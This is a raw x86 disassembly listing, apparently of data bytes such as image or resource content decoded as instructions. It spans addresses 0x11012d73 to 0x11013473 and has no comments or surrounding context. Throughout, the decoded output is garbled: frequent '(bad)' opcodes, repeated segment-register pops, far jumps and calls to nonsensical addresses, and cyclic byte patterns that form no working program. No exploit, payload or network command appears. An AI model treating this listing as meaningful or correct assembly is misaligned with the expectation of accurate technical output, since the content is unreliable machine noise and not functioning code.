11012d73:	jmp    FWORD PTR [esi]
11012d75:	sbb    dl,BYTE PTR [ecx]
11012d77:	inc    DWORD PTR [ebx]
11012d79:	add    al,BYTE PTR [ecx]
11012d7b:	call   FWORD PTR [edi]
11012d7d:	pop    ds
11012d7e:	pop    ds
11012d7f:	(bad)  
11012d80:	fcmovu st,st(2)
11012d82:	(bad)  
11012d84:	(bad)  
11012d85:	(bad)  
11012d86:	std    
11012d87:	(bad)  
11012d88:	(bad)  
11012d89:	(bad)  
11012d8a:	(bad)  
11012d8b:	(bad)  
11012d8c:	(bad)  
11012d8d:	(bad)  
11012d8e:	std    
11012d8f:	(bad)  
11012d90:	(bad)  
11012d91:	(bad)  
11012d92:	std    
11012d93:	(bad)  
11012d94:	sti    
11012d95:	in     eax,dx
11012d96:	call   0xbcc11e9a
11012d9b:	jmp    esi
11012d9d:	xchg   esi,eax
11012d9e:	jns    0x11012d9f
11012da0:	fidivr WORD PTR [ebx+0x57]
11012da3:	(bad)  
11012da4:	fsubr  DWORD PTR [ebx+0x44]
11012da7:	call   ebp
11012da9:	addr16 inc ecx
11012dab:	call   edi
11012dad:	jno    0x11012dfe
11012daf:	(bad)  
11012db0:	fmul   QWORD PTR [edx-0x4b170091]
11012db6:	mov    ds:0xe5e9f8ff,eax
11012dbb:	(bad)  
11012dbc:	std    
11012dbd:	std    
11012dbe:	std    
11012dbf:	(bad)  
11012dc0:	(bad)  
11012dc1:	(bad)  
11012dc2:	std    
11012dc3:	(bad)  
11012dc4:	std    
11012dc5:	std    
11012dc6:	std    
11012dc7:	(bad)  
11012dc8:	(bad)  
11012dc9:	(bad)  
11012dca:	(bad)  
11012dcb:	(bad)  
11012dcc:	fcomp  st(0)
11012dce:	fdivr  st,st(7)
11012dd0:	sbb    eax,0x3ff1d1d
11012dd5:	add    al,BYTE PTR [ecx]
11012dd7:	jmp    FWORD PTR [esi]
11012dd9:	sbb    DWORD PTR [eax],edx
11012ddb:	call   FWORD PTR [edx+0x32]
11012dde:	and    edi,edi
11012de0:	xchg   BYTE PTR [ecx+esi*1-0x1],cl
11012de4:	mov    cl,0x64
11012de6:	inc    ecx
11012de7:	jmp    DWORD PTR [ebp+0x39]
11012dea:	and    eax,0xff
11012def:	inc    DWORD PTR [eax]
11012df1:	add    BYTE PTR [eax],al
11012df3:	mov    edi,0x80000000
11012df8:	add    BYTE PTR [eax],al
11012dfa:	add    BYTE PTR [ecx+0x0],al
11012dfd:	add    BYTE PTR [eax],al
11012dff:	sbb    BYTE PTR [eax],al
11012e01:	add    BYTE PTR [eax],al
11012e03:	push   es
	...
11012e14:	add    BYTE PTR [eax],al
11012e16:	add    BYTE PTR [ecx],al
11012e18:	add    BYTE PTR [eax],al
11012e1a:	add    BYTE PTR [ebx],cl
11012e1c:	add    BYTE PTR [eax],al
11012e1e:	add    BYTE PTR [esi],ah
11012e20:	add    BYTE PTR [eax],al
11012e22:	add    bh,bh
11012e24:	push   ebx
11012e25:	das    
11012e26:	push   ds
11012e27:	inc    DWORD PTR [edi+0x5aff314c]
11012e2d:	xor    ah,BYTE PTR [ecx]
11012e2f:	jmp    FWORD PTR [esi]
11012e31:	sbb    dl,BYTE PTR [eax]
11012e33:	inc    DWORD PTR [edx+eax*1]
11012e36:	add    edi,edi
11012e38:	pop    ds
11012e39:	pop    ds
11012e3a:	pop    ds
11012e3b:	(bad)  
11012e3c:	(bad)  
11012e3e:	fcos   
11012e40:	(bad)  
11012e41:	(bad)  
11012e42:	(bad)  
11012e43:	(bad)  
11012e44:	(bad)  
11012e45:	(bad)  
11012e46:	(bad)  
11012e47:	(bad)  
11012e48:	(bad)  
11012e49:	(bad)  
11012e4a:	(bad)  
11012e4b:	(bad)  
11012e4c:	cld    
11012e4d:	out    dx,eax
11012e4e:	jmp    0xe4ff:0x8eaaefff
11012e55:	js     0x11012ea5
11012e57:	jmp    eax
11012e59:	jno    0x11012ea1
11012e5b:	(bad)  
11012e5c:	(bad)  [ebp+0x43]
11012e5f:	(bad)  
11012e60:	fisubr DWORD PTR [edx+0x40]
11012e63:	(bad)  
11012e64:	fsub   DWORD PTR [esi+0x3e]
11012e67:	call   ebp
11012e69:	arpl   WORD PTR [ebx],di
11012e6b:	call   edx
11012e6d:	pop    edi
11012e6e:	cmp    bh,bh
11012e70:	rcr    BYTE PTR [ebp+esi*1-0x1],1
11012e74:	int    0x59
11012e76:	xor    bh,bh
11012e78:	int3   
11012e79:	pop    edx
11012e7a:	xor    eax,0x7a91ddff
11012e7f:	(bad)  
11012e80:	clc    
11012e81:	jmp    0xfffd:0xfefeffe6
11012e88:	(bad)  
11012e89:	(bad)  
11012e8a:	(bad)  
11012e8b:	(bad)  
11012e8c:	(bad)  
11012e8d:	(bad)  
11012e8e:	(bad)  
11012e8f:	(bad)  
11012e90:	fcomp  st(0)
11012e92:	xlat   BYTE PTR ds:[ebx]
11012e93:	call   FWORD PTR ds:0x3ff1d1d
11012e99:	add    al,BYTE PTR [ecx]
11012e9b:	jmp    FWORD PTR [esi]
11012e9d:	sbb    DWORD PTR [eax],edx
11012e9f:	call   FWORD PTR [edx+0x32]
11012ea2:	and    edi,edi
11012ea4:	xchg   DWORD PTR [edx+esi*1-0x1],ecx
11012ea8:	push   ebx
11012ea9:	das    
11012eaa:	pop    ds
11012eab:	inc    DWORD PTR [eax]
11012ead:	add    BYTE PTR [eax],al
11012eaf:	inc    DWORD PTR [eax]
11012eb1:	add    BYTE PTR [eax],al
11012eb3:	rol    DWORD PTR [eax],0x0
11012eb6:	add    BYTE PTR [edx+0x42000000],al
11012ebc:	add    BYTE PTR [eax],al
11012ebe:	add    BYTE PTR [eax],bl
11012ec0:	add    BYTE PTR [eax],al
11012ec2:	add    BYTE PTR [esi],al
	...
11012ed0:	add    BYTE PTR [eax],al
11012ed2:	add    BYTE PTR [ecx],al
11012ed4:	add    BYTE PTR [eax],al
11012ed6:	add    BYTE PTR ds:0x15000000,al
11012edc:	add    BYTE PTR [eax],al
11012ede:	add    BYTE PTR [eax],bh
11012ee0:	add    BYTE PTR [eax],al
11012ee2:	add    bh,bh
11012ee4:	cmp    eax,0x5aff1622
11012ee9:	xor    esp,DWORD PTR [ecx]
11012eeb:	jmp    FWORD PTR [esi]
11012eed:	sbb    dl,BYTE PTR [ecx]
11012eef:	inc    DWORD PTR [edx+eax*1]
11012ef2:	add    edi,edi
11012ef4:	sbb    eax,0xdaff1d1d
11012ef9:	fcmovu st,st(2)
11012efb:	(bad)  
11012efc:	(bad)  
11012efd:	(bad)  
11012efe:	(bad)  
11012eff:	(bad)  
11012f00:	(bad)  
11012f01:	(bad)  
11012f02:	std    
11012f03:	(bad)  
11012f04:	(bad)  
11012f05:	(bad)  
11012f06:	std    
11012f07:	(bad)  
11012f08:	stc    
11012f09:	(bad)  
11012f0a:	(bad)  
11012f0b:	(bad)  
11012f0c:	in     al,dx
11012f0d:	mov    BYTE PTR [ebp-0x1],bl
11012f10:	call   0xf7007e91
11012f15:	jns    0x11012f63
11012f17:	jmp    edx
11012f19:	jne    0x11012f64
11012f1b:	jmp    eax
11012f1d:	jno    0x11012f66
11012f1f:	(bad)  
11012f20:	(bad)  [esi+0x44]
11012f23:	(bad)  
11012f24:	fisubr DWORD PTR [ebx+0x41]
11012f27:	(bad)  
11012f28:	fsub   DWORD PTR [edi+0x3f]
11012f2b:	call   ebp
11012f2d:	arpl   WORD PTR [edi+edi*8],di
11012f30:	rcr    BYTE PTR [edi+0x39],cl
11012f33:	call   eax
11012f35:	pop    esp
11012f36:	xor    eax,0x3259cdff
11012f3b:	dec    edx
11012f3d:	push   ebp
11012f3e:	xor    bh,bh
11012f40:	int3   
11012f41:	pop    ebp
11012f42:	cmp    edi,edi
11012f44:	in     al,dx
11012f45:	les    edi,FWORD PTR [eax-0x1010101]
11012f4b:	(bad)  
11012f4c:	(bad)  
11012f4d:	(bad)  
11012f4e:	(bad)  
11012f4f:	(bad)  
11012f50:	(bad)  
11012f51:	(bad)  
11012f52:	(bad)  
11012f53:	(bad)  
11012f54:	fcomp  st(0)
11012f56:	fdivr  st,st(7)
11012f58:	sbb    al,0x1c
11012f5a:	sbb    edi,edi
11012f5c:	add    eax,DWORD PTR [edx]
11012f5e:	add    edi,edi
11012f60:	sbb    DWORD PTR cs:[eax],edx
11012f63:	call   FWORD PTR [edx+0x33]
11012f66:	and    edi,edi
11012f68:	cmp    eax,0xff1622
11012f6d:	add    BYTE PTR [eax],al
11012f6f:	inc    DWORD PTR [eax]
11012f71:	add    BYTE PTR [eax],al
11012f73:	mov    BYTE PTR [eax],0x0
11012f76:	add    BYTE PTR [edi+0x45000000],al
11012f7c:	add    BYTE PTR [eax],al
11012f7e:	add    BYTE PTR [ecx],bl
11012f80:	add    BYTE PTR [eax],al
11012f82:	add    BYTE PTR [esi],al
	...
11012f8c:	add    BYTE PTR [eax],al
11012f8e:	add    BYTE PTR [ecx],al
11012f90:	add    BYTE PTR [eax],al
11012f92:	add    BYTE PTR ds:0x10000000,al
11012f98:	add    BYTE PTR [eax],al
11012f9a:	add    BYTE PTR [edx],ch
11012f9c:	add    BYTE PTR [eax],al
11012f9e:	add    BYTE PTR [edi+0x0],dl
11012fa1:	add    BYTE PTR [eax],al
11012fa3:	jmp    DWORD PTR [edi]
11012fa5:	push   ss
11012fa6:	push   cs
11012fa7:	jmp    FWORD PTR [esi]
11012fa9:	sbb    dl,BYTE PTR [ecx]
11012fab:	inc    DWORD PTR [ebx]
11012fad:	add    al,BYTE PTR [ecx]
11012faf:	call   FWORD PTR [edi]
11012fb1:	pop    ds
11012fb2:	pop    ds
11012fb3:	(bad)  
11012fb4:	fcmovu st,st(2)
11012fb6:	(bad)  
11012fb8:	(bad)  
11012fb9:	(bad)  
11012fba:	(bad)  
11012fbb:	(bad)  
11012fbc:	(bad)  
11012fbd:	(bad)  
11012fbe:	(bad)  
11012fbf:	(bad)  
11012fc0:	(bad)  
11012fc1:	(bad)  
11012fc2:	std    
11012fc3:	(bad)  
11012fc4:	cli    
11012fc5:	int    0xb9
11012fc7:	push   eax
11012fc9:	xchg   DWORD PTR [ecx-0x1],ebx
11012fcc:	in     eax,dx
11012fcd:	adc    DWORD PTR [ebp-0x1],0xffffffea
11012fd1:	adc    BYTE PTR [ebx-0x1],0xe8
11012fd5:	jge    0x11013027
11012fd7:	jmp    ebp
11012fd9:	jns    0x11013029
11012fdb:	jmp    ebx
11012fdd:	jbe    0x1101302a
11012fdf:	jmp    ecx
11012fe1:	jb     0x1101302b
11012fe3:	(bad)  
11012fe4:	fisubr WORD PTR [edi+0x45]
11012fe7:	(bad)  
11012fe8:	fld    TBYTE PTR [ebx+0x42]
11012feb:	(bad)  
11012fec:	fsub   DWORD PTR [edi+0x3f]
11012fef:	call   ebp
11012ff1:	fs cmp al,0xff
11012ff4:	rcr    BYTE PTR [edi+0x39],cl
11012ff7:	call   eax
11012ff9:	pop    esp
11012ffa:	ss dec ebp
11012ffd:	pop    ecx
11012ffe:	xor    edi,edi
11013000:	retf   0x2f55
11013003:	dec    ecx
11013005:	push   ebx
11013006:	das    
11013007:	jmp    edi
11013009:	mov    ah,0xa4
1101300b:	(bad)  
1101300c:	(bad)  
1101300d:	(bad)  
1101300e:	(bad)  
1101300f:	(bad)  
11013010:	(bad)  
11013011:	(bad)  
11013012:	(bad)  
11013013:	(bad)  
11013014:	(bad)  
11013015:	(bad)  
11013016:	(bad)  
11013017:	(bad)  
11013018:	fcomp  st(0)
1101301a:	fdivr  st,st(7)
1101301c:	push   ds
1101301d:	push   ds
1101301e:	sbb    eax,0x10203ff
11013023:	jmp    FWORD PTR [esi]
11013025:	sbb    dl,BYTE PTR [ecx]
11013027:	jmp    DWORD PTR [edi]
11013029:	push   ss
1101302a:	push   cs
1101302b:	inc    DWORD PTR [eax]
1101302d:	add    BYTE PTR [eax],al
1101302f:	inc    DWORD PTR [eax]
11013031:	add    BYTE PTR [eax],al
11013033:	iret   
11013034:	add    BYTE PTR [eax],al
11013036:	add    BYTE PTR [ecx+0x4c000000],dl
1101303c:	add    BYTE PTR [eax],al
1101303e:	add    BYTE PTR [eax+eax*1],bl
11013041:	add    BYTE PTR [eax],al
11013043:	push   es
11013044:	add    BYTE PTR [eax],al
11013046:	add    BYTE PTR [eax],al
11013048:	add    BYTE PTR [eax],al
1101304a:	add    BYTE PTR [ecx],al
1101304c:	add    BYTE PTR [eax],al
1101304e:	add    BYTE PTR ds:0xf000000,al
11013054:	add    BYTE PTR [eax],al
11013056:	add    BYTE PTR ds:0x49000000,ah
1101305c:	add    BYTE PTR [eax],al
1101305e:	add    BYTE PTR [esi+0x0],bh
11013061:	add    BYTE PTR [eax],al
11013063:	call   DWORD PTR [eax]
11013065:	or     DWORD PTR ds:0x10204ff,eax
1101306b:	call   FWORD PTR [edi]
1101306d:	pop    ds
1101306e:	pop    ds
1101306f:	(bad)  
11013070:	(bad)  
11013072:	fcos   
11013074:	std    
11013075:	std    
11013076:	std    
11013077:	(bad)  
11013078:	std    
11013079:	std    
1101307a:	std    
1101307b:	(bad)  
1101307c:	(bad)  
1101307d:	(bad)  
1101307e:	std    
1101307f:	(bad)  
11013080:	sti    
11013081:	fmul   st,st(0)
11013083:	push   esp
11013085:	mov    WORD PTR [ebp-0x1],ds
11013088:	repnz mov bl,BYTE PTR [ebx-0x1]
1101308c:	out    dx,eax
1101308d:	xchg   DWORD PTR [ecx-0x1],ebx
11013090:	in     eax,dx
11013091:	test   DWORD PTR [edi-0x1],edx
11013094:	jmp    0x11013018
11013096:	push   ebp
11013097:	(bad)  
11013098:	call   0xf800831b
1101309d:	jnp    0x110130ee
1101309f:	jmp    ebx
110130a1:	ja     0x110130ef
110130a3:	jmp    ecx
110130a5:	jae    0x110130f0
110130a7:	(bad)  
110130a8:	fidiv  WORD PTR [eax+0x46]
110130ab:	(bad)  
110130ac:	fld    TBYTE PTR [ebx+0x43]
110130af:	(bad)  
110130b0:	fsub   DWORD PTR [edi+0x3f]
110130b3:	call   ebp
110130b5:	fs cmp al,0xff
110130b8:	shl    DWORD PTR [eax+0x39],cl
110130bb:	call   eax
110130bd:	pop    esp
110130be:	ss dec ebp
110130c1:	pop    ecx
110130c2:	xor    edi,edi
110130c4:	retf   0x3055
110130c7:	dec    ecx
110130c9:	push   ebx
110130ca:	das    
110130cb:	(bad)  
110130cc:	in     al,dx
110130cd:	les    edi,FWORD PTR [eax-0x2010101]
110130d3:	(bad)  
110130d4:	(bad)  
110130d5:	(bad)  
110130d6:	std    
110130d7:	(bad)  
110130d8:	std    
110130d9:	std    
110130da:	std    
110130db:	call   edi
110130dd:	xlat   BYTE PTR ds:[ebx]
110130de:	xlat   BYTE PTR ds:[ebx]
110130df:	call   FWORD PTR [esi]
110130e1:	push   ds
110130e2:	sbb    eax,0x10204ff
110130e7:	call   DWORD PTR [eax]
110130e9:	or     DWORD PTR ds:0xff,eax
110130ef:	inc    DWORD PTR [eax]
110130f1:	add    BYTE PTR [eax],al
110130f3:	fiadd  DWORD PTR [eax]
110130f5:	add    BYTE PTR [eax],al
110130f7:	mov    eax,ds:0x5c000000
110130fc:	add    BYTE PTR [eax],al
110130fe:	add    BYTE PTR [esi],ah
11013100:	add    BYTE PTR [eax],al
11013102:	add    BYTE PTR [edx],cl
11013104:	add    BYTE PTR [eax],al
11013106:	add    BYTE PTR [ecx],al
11013108:	add    BYTE PTR [eax],al
1101310a:	add    BYTE PTR ds:0xf000000,al
11013110:	add    BYTE PTR [eax],al
11013112:	add    BYTE PTR [eax+eax*1],ah
11013115:	add    BYTE PTR [eax],al
11013117:	inc    esi
11013118:	add    BYTE PTR [eax],al
1101311a:	add    BYTE PTR [eax+eax*1+0x0],dh
1101311e:	add    BYTE PTR [eax-0x1000000],ch
11013124:	add    BYTE PTR [eax],al
11013126:	add    bh,bh
11013128:	sbb    eax,0xdaff1d1d
1101312d:	fcmovu st,st(2)
1101312f:	(bad)  
11013130:	(bad)  
11013131:	(bad)  
11013132:	(bad)  
11013133:	(bad)  
11013134:	(bad)  
11013135:	(bad)  
11013136:	std    
11013137:	(bad)  
11013138:	(bad)  
11013139:	(bad)  
1101313a:	std    
1101313b:	(bad)  
1101313c:	std    
1101313d:	icebp  
1101313e:	jmp    0x1101313f
11013140:	hlt    
11013141:	xchg   ebx,eax
11013142:	push   0x5e8cf3ff
11013147:	push   ebx
11013149:	lea    ebx,[esi-0x1]
1101314c:	repnz lea ebx,[edi-0x1]
11013150:	icebp  
11013151:	mov    bl,BYTE PTR [ebp-0x1]
11013154:	out    dx,al
11013155:	xchg   BYTE PTR [edx-0x1],bl
11013158:	jmp    0x110130dd
1101315a:	push   edi
1101315b:	(bad)  
1101315c:	jmp    0xf80085e0
11013161:	jnp    0x110131b3
11013163:	jmp    esp
11013165:	js     0x110131b4
11013167:	jmp    ecx
11013169:	jae    0x110131b5
1101316b:	(bad)  
1101316c:	fidiv  WORD PTR [eax+0x46]
1101316f:	(bad)  
11013170:	fld    TBYTE PTR [ebx+eax*2-0x1]
11013174:	fsub   DWORD PTR [edi+0x3f]
11013177:	call   esi
11013179:	fs cmp al,0xff
1101317c:	shl    DWORD PTR [eax+0x39],cl
1101317f:	call   eax
11013181:	pop    esp
11013182:	ss dec ebp
11013185:	pop    ecx
11013186:	xor    edi,edi
11013188:	retf   0x3055
1101318b:	dec    esp
1101318d:	pop    ebp
1101318e:	cmp    edi,edi
11013190:	clc    
11013191:	jmp    0xfffe:0xfefeffe6
11013198:	std    
11013199:	std    
1101319a:	std    
1101319b:	(bad)  
1101319c:	(bad)  
1101319d:	(bad)  
1101319e:	std    
1101319f:	(bad)  
110131a0:	fcomp  st(0)
110131a2:	fdivr  st,st(7)
110131a4:	sbb    al,0x1c
110131a6:	sbb    al,0xff
110131a8:	add    BYTE PTR [eax],al
110131aa:	add    bh,bh
110131ac:	add    BYTE PTR [eax],al
110131ae:	add    bh,bh
110131b0:	add    BYTE PTR [eax],al
110131b2:	add    dh,ah
110131b4:	add    BYTE PTR [eax],al
110131b6:	add    BYTE PTR [edi+0x74000000],dh
110131bc:	add    BYTE PTR [eax],al
110131be:	add    BYTE PTR [eax],bh
110131c0:	add    BYTE PTR [eax],al
110131c2:	add    BYTE PTR ds:0x5000000,dl
110131c8:	add    BYTE PTR [eax],al
110131ca:	add    BYTE PTR [edi],cl
110131cc:	add    BYTE PTR [eax],al
110131ce:	add    BYTE PTR [eax+eax*1],ah
110131d1:	add    BYTE PTR [eax],al
110131d3:	inc    esi
110131d4:	add    BYTE PTR [eax],al
110131d6:	add    BYTE PTR [edx+0x0],dh
110131d9:	add    BYTE PTR [eax],al
110131db:	mov    ds:0xd2000000,al
110131e0:	add    BYTE PTR [eax],al
110131e2:	add    bh,bh
110131e4:	pop    ds
110131e5:	pop    ds
110131e6:	pop    ds
110131e7:	(bad)  
110131e8:	fcmovu st,st(2)
110131ea:	fcos   
110131ec:	std    
110131ed:	std    
110131ee:	std    
110131ef:	(bad)  
110131f0:	std    
110131f1:	std    
110131f2:	std    
110131f3:	(bad)  
110131f4:	std    
110131f5:	std    
110131f6:	std    
110131f7:	(bad)  
110131f8:	(bad)  
110131f9:	(bad)  
110131fa:	std    
110131fb:	(bad)  
110131fc:	clc    
110131fd:	mov    bh,0x99
110131ff:	push   ebx
11013201:	lea    ebx,[edi-0x1]
11013204:	hlt    
11013205:	mov    fs,WORD PTR [eax-0x1]
11013208:	hlt    
11013209:	(bad)  
1101320a:	(bad)  
1101320b:	push   esp
1101320d:	(bad)  
1101320e:	(bad)  
1101320f:	push   ebx
11013211:	(bad)  
11013212:	(bad)  
11013213:	push   ecx
11013215:	mov    WORD PTR [edi-0x1],ds
11013218:	out    dx,al
11013219:	mov    BYTE PTR [edi+edi*8-0x14],bl
1101321d:	test   BYTE PTR [ecx-0x1],bl
11013220:	jmp    0xf80087a5
11013225:	jl     0x11013279
11013227:	jmp    esp
11013229:	js     0x11013279
1101322b:	jmp    ecx
1101322d:	je     0x11013279
1101322f:	(bad)  
11013230:	fidiv  WORD PTR [eax+0x46]
11013233:	(bad)  
11013234:	fld    TBYTE PTR [ebx+eax*2-0x1]
11013238:	fldcw  WORD PTR [eax+0x40]
1101323b:	call   esi
1101323d:	fs cmp al,0xff
11013240:	shl    DWORD PTR [eax+0x39],cl
11013243:	call   eax
11013245:	pop    esp
11013246:	ss dec ebp
11013249:	pop    ecx
1101324a:	xor    edi,edi
1101324c:	retf   
1101324d:	push   ebp
1101324e:	xor    bh,bh
11013250:	fst    QWORD PTR [ecx-0x2010086]
11013256:	std    
11013257:	(bad)  
11013258:	std    
11013259:	std    
1101325a:	std    
1101325b:	(bad)  
1101325c:	std    
1101325d:	std    
1101325e:	std    
1101325f:	(bad)  
11013260:	(bad)  
11013261:	(bad)  
11013262:	std    
11013263:	(bad)  
11013264:	fcomp  st(0)
11013266:	fdivr  st,st(7)
11013268:	push   ds
11013269:	push   ds
1101326a:	push   ds
1101326b:	inc    DWORD PTR [eax]
1101326d:	add    BYTE PTR [eax],al
1101326f:	inc    DWORD PTR [eax]
11013271:	add    BYTE PTR [eax],al
11013273:	icebp  
11013274:	add    BYTE PTR [eax],al
11013276:	add    bh,cl
11013278:	add    BYTE PTR [eax],al
1101327a:	add    BYTE PTR [ebp+0x56000000],dl
11013280:	add    BYTE PTR [eax],al
11013282:	add    BYTE PTR [ecx],ch
11013284:	add    BYTE PTR [eax],al
11013286:	add    BYTE PTR [edi],cl
11013288:	add    BYTE PTR [eax],al
1101328a:	add    BYTE PTR [eax],ah
1101328c:	add    BYTE PTR [eax],al
1101328e:	add    BYTE PTR [edx+0x0],al
11013291:	add    BYTE PTR [eax],al
11013293:	outs   dx,DWORD PTR ds:[esi]
11013294:	add    BYTE PTR [eax],al
11013296:	add    BYTE PTR [eax-0x31000000],ah
1101329c:	add    BYTE PTR [eax],al
1101329e:	add    bl,bh
110132a0:	pop    ds
110132a1:	pop    ds
110132a2:	pop    ds
110132a3:	(bad)  
110132a4:	(bad)  
110132a6:	fcos   
110132a8:	(bad)  
110132a9:	(bad)  
110132aa:	std    
110132ab:	(bad)  
110132ac:	(bad)  
110132ad:	(bad)  
110132ae:	std    
110132af:	(bad)  
110132b0:	(bad)  
110132b1:	(bad)  
110132b2:	std    
110132b3:	(bad)  
110132b4:	(bad)  
110132b5:	(bad)  
110132b6:	std    
110132b7:	(bad)  
110132b8:	std    
110132b9:	icebp  
110132ba:	jmp    0x110132bb
110132bc:	hlt    
110132bd:	xchg   ecx,eax
110132be:	fs push ebx
110132c1:	(bad)  
110132c2:	popa   
110132c3:	push   esp
110132c5:	xchg   ecx,eax
110132c6:	fs push esp
110132c9:	xchg   edx,eax
110132ca:	gs push esp
110132cd:	xchg   edx,eax
110132ce:	push   sp
110132d1:	xchg   ebx,eax
110132d2:	push   bx
110132d5:	xchg   ecx,eax
110132d6:	gs push ecx
110132d9:	lea    esp,[edx-0x1]
110132dc:	out    dx,al
110132dd:	mov    DWORD PTR [esi-0x1],ebx
110132e0:	in     al,dx
110132e1:	xchg   BYTE PTR [edx-0x1],bl
110132e4:	jmp    0xf800896a
110132e9:	jge    0x1101333d
110132eb:	jmp    ebx
110132ed:	jns    0x1101333d
110132ef:	jmp    ecx
110132f1:	je     0x1101333d
110132f3:	(bad)  
110132f4:	fidiv  WORD PTR [eax+0x47]
110132f7:	(bad)  
110132f8:	fld    TBYTE PTR [ebx+eax*2-0x1]
110132fc:	fldcw  WORD PTR [eax+0x40]
110132ff:	call   esi
11013301:	fs cmp al,0xff
11013304:	shl    DWORD PTR [eax+0x39],cl
11013307:	call   eax
11013309:	pop    esp
1101330a:	ss dec ebp
1101330d:	pop    ecx
1101330e:	xor    bh,bh
11013310:	int3   
11013311:	pop    ecx
11013312:	xor    eax,0xe5eaf8ff
11013317:	(bad)  
11013318:	std    
11013319:	std    
1101331a:	std    
1101331b:	(bad)  
1101331c:	(bad)  
1101331d:	(bad)  
1101331e:	std    
1101331f:	(bad)  
11013320:	(bad)  
11013321:	(bad)  
11013322:	std    
11013323:	(bad)  
11013324:	std    
11013325:	std    
11013326:	std    
11013327:	call   edi
11013329:	xlat   BYTE PTR ds:[ebx]
1101332a:	xlat   BYTE PTR ds:[ebx]
1101332b:	call   FWORD PTR [esi]
1101332d:	push   ds
1101332e:	push   ds
1101332f:	inc    DWORD PTR [eax]
11013331:	add    BYTE PTR [eax],al
11013333:	inc    BYTE PTR [eax]
11013335:	add    BYTE PTR [eax],al
11013337:	in     eax,0x0
11013339:	add    BYTE PTR [eax],al
1101333b:	mov    bh,0x0
1101333d:	add    BYTE PTR [eax],al
1101333f:	jl     0x11013341
11013341:	add    BYTE PTR [eax],al
11013343:	inc    esi
11013344:	add    BYTE PTR [eax],al
11013346:	add    BYTE PTR [eax],ah
11013348:	add    BYTE PTR [eax],al
1101334a:	add    BYTE PTR [eax+eax*1],dh
1101334d:	add    BYTE PTR [eax],al
1101334f:	arpl   WORD PTR [eax],ax
11013351:	add    BYTE PTR [eax],al
11013353:	cwde   
11013354:	add    BYTE PTR [eax],al
11013356:	add    ah,cl
11013358:	add    BYTE PTR [eax],al
1101335a:	add    dl,bh
1101335c:	sbb    eax,0xdaff1d1d
11013361:	fcmovu st,st(2)
11013363:	(bad)  
11013364:	(bad)  
11013365:	(bad)  
11013366:	(bad)  
11013367:	(bad)  
11013368:	(bad)  
11013369:	(bad)  
1101336a:	std    
1101336b:	(bad)  
1101336c:	(bad)  
1101336d:	(bad)  
1101336e:	(bad)  
1101336f:	(bad)  
11013370:	(bad)  
11013371:	(bad)  
11013372:	(bad)  
11013373:	(bad)  
11013374:	(bad)  
11013375:	(bad)  
11013376:	(bad)  
11013377:	(bad)  
11013378:	cli    
11013379:	int    0xb8
1101337b:	push   esp
1101337d:	nop
1101337e:	(bad)  
1101337f:	push   esp
11013381:	xchg   edx,eax
11013382:	gs push esp
11013385:	xchg   esp,eax
11013386:	push   0x6a95f4ff
1101338b:	push   esp
1101338d:	xchg   ebp,eax
1101338e:	imul   edi,edi,0xfffffff4
11013391:	xchg   esi,eax
11013392:	imul   edi,edi,0xfffffff4
11013395:	xchg   ebp,eax
11013396:	push   0xffffffff
11013398:	repz xchg ebx,eax
1101339a:	push   0x648ff1ff
1101339f:	(bad)  
110133a0:	out    dx,al
110133a1:	mov    esp,DWORD PTR [eax-0x1]
110133a4:	jmp    0x1101332d
110133a6:	pop    esp
110133a7:	(bad)  
110133a8:	jmp    0xf8008b2f
110133ad:	jge    0x11013402
110133af:	jmp    ebx
110133b1:	jns    0x11013401
110133b3:	jmp    eax
110133b5:	je     0x11013401
110133b7:	(bad)  
110133b8:	fidiv  WORD PTR [eax+0x47]
110133bb:	(bad)  
110133bc:	fld    TBYTE PTR [ebx+eax*2-0x1]
110133c0:	fldcw  WORD PTR [eax+0x40]
110133c3:	call   esi
110133c5:	fs cmp al,0xff
110133c8:	shl    BYTE PTR [eax+0x39],cl
110133cb:	call   eax
110133cd:	pop    esp
110133ce:	xor    eax,0x3259cdff
110133d3:	(bad)  
110133d4:	call   0x1000d78d
110133d9:	(bad)  
110133da:	(bad)  
110133db:	(bad)  
110133dc:	(bad)  
110133dd:	(bad)  
110133de:	(bad)  
110133df:	(bad)  
110133e0:	(bad)  
110133e1:	(bad)  
110133e2:	(bad)  
110133e3:	(bad)  
110133e4:	(bad)  
110133e5:	(bad)  
110133e6:	(bad)  
110133e7:	(bad)  
110133e8:	(bad)  
110133e9:	(bad)  
110133ea:	(bad)  
110133eb:	(bad)  
110133ec:	fcomp  st(0)
110133ee:	fdivr  st,st(7)
110133f0:	sbb    al,0x1c
110133f2:	sbb    al,0xff
110133f4:	add    BYTE PTR [eax],al
110133f6:	add    ah,bh
110133f8:	add    BYTE PTR [eax],al
110133fa:	add    al,bl
110133fc:	add    BYTE PTR [eax],al
110133fe:	add    BYTE PTR [eax+0x66000000],ah
11013404:	add    BYTE PTR [eax],al
11013406:	add    BYTE PTR ds:0x43000000,dh
1101340c:	add    BYTE PTR [eax],al
1101340e:	add    BYTE PTR [ecx+0x0],bh
11013411:	add    BYTE PTR [eax],al
11013413:	mov    edx,0xfa000000
11013418:	pop    ds
11013419:	pop    ds
1101341a:	pop    ds
1101341b:	(bad)  
1101341c:	fcmovu st,st(2)
1101341e:	(bad)  
11013420:	(bad)  
11013421:	(bad)  
11013422:	(bad)  
11013423:	(bad)  
11013424:	(bad)  
11013425:	(bad)  
11013426:	(bad)  
11013427:	(bad)  
11013428:	(bad)  
11013429:	(bad)  
1101342a:	(bad)  
1101342b:	(bad)  
1101342c:	(bad)  
1101342d:	(bad)  
1101342e:	(bad)  
1101342f:	(bad)  
11013430:	(bad)  
11013431:	(bad)  
11013432:	(bad)  
11013433:	(bad)  
11013434:	(bad)  
11013435:	(bad)  
11013436:	(bad)  
11013437:	(bad)  
11013438:	clc    
11013439:	mov    cl,0x91
1101343b:	push   esp
1101343d:	xchg   ebx,eax
1101343e:	addr16 push esp
11013441:	xchg   esi,eax
11013442:	imul   edi,edi,0xfffffff5
11013445:	cwde   
11013446:	outs   dx,DWORD PTR ds:[esi]
11013447:	push   ebp
11013449:	call   0xff71:0x9af5ff71
11013450:	cmc    
11013451:	call   0xff70:0x99f5ff71
11013458:	hlt    
11013459:	cwde   
1101345a:	outs   dx,DWORD PTR ds:[esi]
1101345b:	push   esp
1101345d:	xchg   esi,eax
1101345e:	ins    BYTE PTR es:[edi],dx
1101345f:	push   ecx
11013461:	xchg   ecx,eax
11013462:	addr16 (bad) 
11013464:	out    dx,eax
11013465:	mov    WORD PTR [edx-0x1],fs
11013468:	in     al,dx
11013469:	xchg   DWORD PTR [ebp-0x1],ebx
1101346c:	jmp    0xf8008cf3
11013471:	jge    0x110134c6
11013473:	jmp    ebx
